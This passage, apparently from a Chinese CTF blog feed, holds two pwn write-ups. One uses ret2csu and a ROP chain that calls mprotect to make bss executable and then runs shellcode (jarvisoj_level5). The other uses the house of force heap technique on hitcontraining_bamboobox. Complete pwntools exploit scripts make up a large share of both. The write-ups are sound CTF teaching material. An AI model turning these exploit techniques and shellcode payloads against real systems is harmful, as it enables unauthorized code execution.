        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这一种办法一般来说不是很实用 当个额外的知识点扩展就好了 难免有的新生赛想考</p><p>在程序开启了NX保护的前提下 我们没有办法通过在bss段写入shellcode后覆盖ret addr为shellcode首地址来实现shell</p><p>这是因为bss段此时的执行权限为rw-p</p><p><a href="https://pic.imgdb.cn/item/63de68064757feff3399796c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63de68064757feff3399796c.png"></a></p><p>意为可读可写 但不可执行 所以位于bss段的shellcode无法发挥作用</p><p>但是在c语言中存在一个mprotect函数 其作用为把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mprotect(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span><br></pre></td></tr></table></figure><p>prot为7时 可以设置内存区域权限为rwx-p 即可读可写可执行 这样就能让shellcode起作用</p><p>下面来看一道例题加深理解</p><h2 id="jarvisoj-level5"><a href="#jarvisoj-level5" class="headerlink" title="jarvisoj_level5"></a>jarvisoj_level5</h2><p>checksec看一下保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没开RELRO 但是开了NX</p><p>ida看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进一下vulnerable_function函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一次栈溢出的机会 不同于其他经典的ret2libc题目 这题的plt表只有read和write函数 由于write函数泄露函数真实地址需要控制三个寄存器</p><p>所以这里用csu的办法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25692)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./locate_libc2.23&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">back_addr = <span class="number">0x4005e6</span></span><br><span class="line">gadget1_addr = <span class="number">0x400690</span></span><br><span class="line">gadget2_addr = <span class="number">0x4006AA</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x600A88</span>+<span class="number">0x50</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(gadget2_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">0x8</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)+p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>接下来就是构造mprotect函数来实现bss段的权限修改</p><p>同时解答一下pop rsi和pop rdx两条指令哪来的 这题是动态链接 二进制文件中是不存在这两条指令的</p><p>但是如果题目有提供libc文件 也是可以ROPgadget查找libc文件的指令 前提是我们获取了libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">mprotect_addr = libc_addr + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x1b92</span></span><br><span class="line">rsi_addr = libc_addr + <span class="number">0x202f8</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(rdi_addr)+p64(<span class="number">0x600000</span>)+p64(rsi_addr)+p64(<span class="number">0x1000</span>)+p64(rdx_addr)+p64(<span class="number">7</span>)+p64(mprotect_addr)+p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>gdb动调看一下mprotect函数是否生效</p><p><a href="https://pic.imgdb.cn/item/63de72444757feff33adbc18.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63de72444757feff33adbc18.png"></a></p><p>可以看到0x600000-0x601000的内存区域权限已经被修改为rwxp 可读可写可执行了</p><p>那么接下来我们构造read函数 并且将最后的返回地址设置为shellcode首地址 就可以获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x600A88</span>+<span class="number">0x50</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="number">0x100</span>)+p64(read_addr)+p64(bss_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>当题目没有给我们libc文件的时候 这时候我们无法通过libc文件来获取pop rsi和pop rdx指令地址来构造rop链 这时候只能通过csu来</p><p>但是csu实现函数调用是使用call指令 call指令需要有一个类似于got表的地址链才能实现</p><p>比如:    bss_addr(存放着main函数的地址)  这时候call bss_addr 就相当于执行main函数</p><p>所以我们跟上面一步相比 还需要多出一个read链来读入mprotect_addr</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25692)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./locate_libc2.23&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">back_addr = <span class="number">0x4005e6</span></span><br><span class="line">gadget1_addr = <span class="number">0x400690</span></span><br><span class="line">gadget2_addr = <span class="number">0x4006AA</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x600A88</span>+<span class="number">0x50</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(gadget2_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">0x8</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)+p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">mprotect_addr = libc_addr + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(gadget2_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0x8</span>)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)+p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.send(p64(mprotect_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(gadget2_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(bss_addr)+p64(<span class="number">7</span>)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0x600000</span>)+p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)+p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x80</span>+<span class="number">0x8</span>)+p64(gadget2_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0x100</span>)+p64(bss_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)+p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>house of force</title>
      <link href="/2023/02/03/house-of-force/"/>
      <url>/2023/02/03/house-of-force/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一种修改top chunk的地址来获取低地址处内存空间的chunk的办法</p><p>复习一下chunk的申请办法 是先判断bin中是否有符合大小的chunk 如果没有再去top chunk分配</p><p>top chunk的分配办法是在top chunk顶部分配出一个空间 随后top chunk的位置向高地址处增加</p><p>这一过程我们来看一下源码是如何实现的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;<span class="comment">//获取当前top chunk的地址</span></span><br><span class="line">size = chunksize (victim);<span class="comment">//获取当前top chunk的大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line"><span class="comment">//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20</span></span><br><span class="line"><span class="comment">//nb为实际要获取的chunk大小(申请的大小加上MINSIZE)</span></span><br><span class="line"><span class="comment">//判断式是为了保证top chunk有足够大小的空间来供此次申请</span></span><br><span class="line"><span class="comment">//之所以要加上MINSIZE是因为为了确保申请完chunk后 top chunk还能保持完整的chunk结构</span></span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//remainder_size为分配chunk后的top chunk大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);<span class="comment">//remainder为分配完后的top chunk地址</span></span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//更新top chunk</span></span><br><span class="line">    <span class="comment">//下面两个set_head给分配出去的堆块以及分配后的top chunk设置新的size</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);<span class="comment">//无关 忽略</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//无关 忽略</span></span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>首先我们需要绕过   size &gt;&#x3D;  nb + MINSIZE   这个判断式 使其结果为True 才能进入if分支</p><p>我们在进行house of force漏洞利用的时候 nb通常都是负数(下面会讲 这里先知道个大概就行) 而你也可以在源码中看到 nb在计算时是被当作一个无符号正数看待的 也就是说计算机遇到负数nb时会将其转化成补码(我在计组原理的文章中有提及)这会使得nb成为一个很庞大的数</p><p>所以我们需要让top chunk的size也作为一个负数 并且这个负数的补码要是所有负数中最大的(或者大于nb即可)</p><p>所以这里通过堆溢出覆盖top chunk的size为0xffffffffffffffff 也就是-1即可</p><p>接着就是if分支中设置top chunk新的地址的算式</p><p>remainder &#x3D; chunk_at_offset (victim, nb) 相当于  victim+nb&#x3D;top_chunk</p><p>原本的top chunk地址加上实际上要分配的大小等于新的top chunk地址</p><p>而nb &#x3D; request_size + MINSIZE   top_chunk &#x3D; request_addr - MINSIZE</p><p>所以request_size &#x3D; request_addr - oldtopchunk_addr - 2*MINSIZE</p><p>接下来我们用一道例题加深一下理解</p><h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p>checksec看一下保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ida看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (**v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  *v4 = hello_message;</span><br><span class="line">  v4[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">  (*v4)();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        show_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        add_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        change_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        remove_item();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4[<span class="number">1</span>]();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;invaild choice!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常规的菜单题 给了输出chunk内容的机会 释放chunk的时候一同置零了指针 不存在UAF漏洞</p><p>具体来看一下main函数开头的几行代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">*v4 = hello_message;</span><br><span class="line">v4[<span class="number">1</span>] = goodbye_message;</span><br><span class="line">(*v4)();</span><br></pre></td></tr></table></figure><p>申请了0x10大小的chunk 依次存放了hello_message的地址和goodbye_message的地址</p><p>并且先执行了hello_message</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hello_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is a box with magic&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;what do you want to do in the box&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而goodbye_message在我们选择退出程序后的分支执行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">goodbye_message</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;See you next time&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thanks you&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且程序还给了一个magic函数 可以直接输出flag信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/home/bamboobox/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以思路就是覆盖v4这个chunk中的goodbye_message 使其为magic函数地址</p><p>为了重复申请到v4这个chunk 就需要我们调整top chunk的地址 使其为v4 chunk的地址 这样再次申请一个chunk就达成目的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25692)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;remove successful!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">magic_addr = <span class="number">0x400d49</span></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>)+p64(magic_addr)</span><br><span class="line">add(-<span class="number">0x70</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此时我们看一下chunk布局</p><p><a href="https://pic.imgdb.cn/item/63dd2d3d4757feff33b8de7a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63dd2d3d4757feff33b8de7a.png"></a></p><p>可以看到top chunk已经调整到了原先v4chunk的位置 我们再次申请一个chunk 看看</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63dd2dc34757feff33b9ec52.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63dd2dc34757feff33b9ec52.png"></a></p><p>可以看到成功覆盖</p><p>那么我们把垃圾数据换成magic函数的地址</p><p>就可以实现flag的泄露(不过你打buu远程不能用这种办法 他docker没还原环境)</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25692)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;remove successful!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">magic_addr = <span class="number">0x400d49</span></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>)+p64(magic_addr)</span><br><span class="line">add(-<span class="number">0x70</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p><a 